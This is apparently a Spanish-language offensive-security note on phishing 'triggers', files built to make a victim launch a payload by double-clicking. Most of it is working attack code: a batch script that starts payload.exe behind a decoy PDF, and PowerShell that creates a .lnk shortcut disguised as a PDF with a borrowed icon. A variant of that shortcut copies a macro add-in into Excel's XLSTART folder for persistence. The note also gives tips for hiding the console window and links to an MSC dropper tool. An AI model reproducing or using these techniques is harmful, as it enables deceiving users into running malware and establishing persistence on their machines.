---
title: Triggers — Activadores de Payload
tags: [initial-access, phishing, batch, lnk, msc, trigger]
---

# Triggers — Activadores de Payload

El trigger es el archivo con el que el usuario interactúa para ejecutar el payload. Debe ser lo más "natural" posible (doble-click).

## Batch (.bat / .cmd / .btm)

Script de texto que ejecuta comandos de Windows.

```bat
@echo off
start payload.exe
start decoy.pdf
exit
```

> [!tip] Ocultar output
> Añadir `> nul 2>&1` al final de cada comando para que no aparezca la ventana.

### Detección del contexto de ejecución

Permite ejecutar código diferente según si se hace doble-click o se corre desde CMD:
- Doble-click: `cmdcmdline` contiene `cmd.exe /c "archivo.bat"`
- Desde CMD: `cmdcmdline` solo contiene `C:\Windows\System32\cmd.exe`

## Shell Link (.lnk)

Shorcut que aparece en el Explorer sin mostrar la extensión `.lnk`. Se puede nombrar `report.pdf.lnk` y el usuario solo ve `report.pdf`.

```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

### Con Excel Add-In payload

```powershell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

## Microsoft Saved Console (.msc)

https://github.com/ZERODETECTION/MSC_Dropper

## Ver también
- [[02-initial-access/containers|Containers]]
- [[02-initial-access/payloads|Payloads]]
- [[02-initial-access/técnicas/delivery|Delivery]]
